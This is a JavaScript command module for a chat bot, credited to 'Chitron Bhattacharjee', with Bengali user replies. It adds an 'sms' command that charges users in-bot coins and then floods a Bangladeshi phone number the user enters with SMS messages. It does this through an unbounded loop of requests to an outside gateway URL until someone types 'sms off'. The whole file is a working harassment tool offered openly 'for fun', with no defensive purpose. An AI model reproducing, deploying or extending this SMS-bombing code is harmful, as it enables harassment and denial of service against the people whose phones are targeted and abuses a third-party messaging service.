const axios = require("axios");
const bombingFlags = {};
const deltaNext = 5;

function expToLevel(exp) {
 return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
}

module.exports = {
 config: {
 name: "sms",
 version: "2.2",
 author: "Chitron Bhattacharjee",
 countDown: 0,
 role: 0,
 shortDescription: {
 en: "Send SMS bomb"
 },
 description: {
 en: "Starts SMS bombing on a number for fun (cost: 100 coins)"
 },
 category: "tools",
 guide: {
 en: "sms 01xxxxxxxxx or sms off"
 }
 },

 onChat: async function ({ event, message, args, usersData }) {
 const threadID = event.threadID;
 const senderID = event.senderID;
 const input = args.join(" ").trim();

 if (!input.toLowerCase().startsWith("sms")) return;

 const number = input.split(" ")[1];

 // 🧠 Get user info
 const userData = await usersData.get(senderID);
 const exp = userData.exp || 0;
 const balance = userData.money || 0;
 const level = expToLevel(exp);

 // ⛔ Level check
 if (level < 2) {
 return message.reply("🚫 এই কমান্ড ব্যবহার করতে আপনার লেভেল কমপক্ষে 2 হতে হবে!");
 }

 // 📴 Stop bombing
 if (number === "off") {
 if (bombingFlags[threadID]) {
 bombingFlags[threadID] = false;
 return message.reply("✅ SMS বোম্বিং বন্ধ করা হয়েছে।");
 } else {
 return message.reply("❗এই থ্রেডে কোনো বোম্বিং চলছিল না।");
 }
 }

 // ❌ Invalid number
 if (!/^01[0-9]{9}$/.test(number)) {
 return message.reply(
 "📱 একটি সঠিক বাংলাদেশি নম্বর দিন!\n" +
 "👉 উদাহরণ: sms 01xxxxxxxxx\n\n" +
 "💸 প্রতি বোম্বিং-এ ১০০ coin কাটা হবে!"
 );
 }

 // 🔁 Already bombing
 if (bombingFlags[threadID]) {
 return message.reply("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে লিখুন: sms off");
 }

 // 💸 Balance check
 if (balance < 100) {
 return message.reply(`❌ আপনার কাছে যথেষ্ট coin নেই!\n🔻 দরকার: 100 coin\n🪙 বর্তমান coin: ${balance}`);
 }

 // ✅ Deduct 100 coin
 await usersData.set(senderID, {
 money: balance - 100
 });

 message.reply(`💥 SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n💸 ১০০ coin কেটে নেওয়া হয়েছে!\n🛑 বন্ধ করতে লিখুন: sms off`);

 bombingFlags[threadID] = true;

 (async function startBombing() {
 while (bombingFlags[threadID]) {
 try {
 await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
 } catch (err) {
 message.reply(`❌ ত্রুটি: ${err.message}`);
 bombingFlags[threadID] = false;
 break;
 }
 }
 })();
 },

 onStart: async function () {}
};